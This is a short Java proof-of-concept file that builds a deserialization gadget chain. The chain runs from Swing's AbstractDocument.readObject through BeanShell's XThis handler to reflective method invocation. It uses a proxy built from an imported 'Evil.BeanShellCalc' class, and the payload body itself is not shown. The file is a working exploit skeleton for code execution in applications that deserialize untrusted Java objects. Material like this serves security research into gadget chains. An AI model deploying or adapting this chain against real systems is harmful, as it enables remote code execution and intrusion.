package com.example.BeanShell;

import com.example.Evil.BeanShellCalc;
import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;

import javax.swing.text.AbstractDocument;
import javax.swing.text.PlainDocument;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;

public class POC_3 {

    /***
     * <javax.swing.text.AbstractDocument: void readObject(java.io.ObjectInputStream)>
     * <javax.swing.text.AbstractDocument$BidiRootElement void <init>()>
     * <javax.swing.text.AbstractDocument$BranchElement void <init>()>
     * <javax.swing.text.AbstractDocument$AbstractElement void <init>()>
     * <bsh.XThis$Handler: java.lang.Object invoke(java.lang.Object,java.lang.reflect.Method,java.lang.Object[])>
     * <bsh.XThis$Handler: java.lang.Object invokeImpl(java.lang.Object,java.lang.reflect.Method,java.lang.Object[])>
     * <bsh.This: java.lang.Object invokeMethod(java.lang.String,java.lang.Object[])>
     * <bsh.This: java.lang.Object invokeMethod(java.lang.String,java.lang.Object[],bsh.Interpreter,bsh.CallStack,bsh.SimpleNode,boolean)>
     * <bsh.BshMethod: java.lang.Object invoke(java.lang.Object[],bsh.Interpreter,bsh.CallStack,bsh.SimpleNode)>
     * <bsh.BshMethod: java.lang.Object invoke(java.lang.Object[],bsh.Interpreter,bsh.CallStack,bsh.SimpleNode,boolean)>
     * <bsh.Reflect: java.lang.Object invokeMethod(java.lang.reflect.Method,java.lang.Object,java.lang.Object[])>
     */

    public static void main(String[] args) throws Exception {
        InvocationHandler handler = BeanShellCalc.getHandler("getEmptySet");
        AbstractDocument.AttributeContext context = (AbstractDocument.AttributeContext) Proxy.newProxyInstance(AbstractDocument.AttributeContext.class.getClassLoader(), new Class<?>[]{AbstractDocument.AttributeContext.class}, handler);

        PlainDocument p = new PlainDocument();
        ReflectionUtil.setField(p, "context", context);

        SerializeUtil.deserialize(SerializeUtil.serialize(p));
    }

}
